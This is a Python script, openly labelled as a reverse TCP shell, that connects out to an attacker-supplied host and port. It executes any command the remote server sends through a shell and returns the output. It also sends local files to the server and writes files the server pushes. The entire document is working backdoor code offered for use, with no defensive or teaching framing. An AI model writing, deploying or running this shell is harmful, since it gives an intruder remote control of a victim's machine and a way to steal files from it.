#this script creates a reverse tcp
#connection to a given host and port.
#Receives commands,executes them and sends
#the output back to the server.

import socket
import subprocess
import os 
import sys

def check_args():
	if len(sys.argv) == 3:
		global ip 
		global port 
		ip = str(sys.argv[1])
		port = int(sys.argv[2])

	else:
		print(f"Usage: python3 {sys.argv[0]} <IP> <port>")
		sys.exit(1)

def download(client, path):
	
	if os.path.exists(path):
		f = open(path,'rb')
		packet = f.read(4096)
		while len(packet) >0 :
			client.send(packet)
			packet = f.read(4096)
		client.send('END'.encode())
		f.close()
	else:
		client.send("File not found".encode())

def upload(client, path):
	f = open(os.path.join(os.getcwd(),os.path.basename(path)),'wb')
	while True:
		bits = client.recv(4096)
		if bits.endswith('END'.encode()):
			f.write(bits[:-3])
			f.close()
			break
		f.write(bits)

def connect():
	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		client.connect((ip, port))
	except Exception as e:
		print({e})
		sys.exit(1)
	finally:
		while True:
			command = client.recv(4096).decode()
			if 'exit' == command:
				client.close()
				break
			elif command.startswith('download '):
				try:
					_, path = command.split(' ')
					download(client,path)
				except:
					pass
			elif command.startswith('upload '):
				try:
					_, path = command.split(' ')
					upload(client,path)
				except:
					pass
			elif command.startswith('cd '):
				try:
					_, path = command.split(' ')
					os.chdir(path)
					client.send(f'[+]Cwd: {path}'.encode())
				except:
					client.send(f'[-]Could not change directory'.encode())
			else:
				exec_command = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
				client.send(exec_command.stdout.read())
				client.send(exec_command.stderr.read())

	
if __name__=='__main__':
	check_args()
	connect()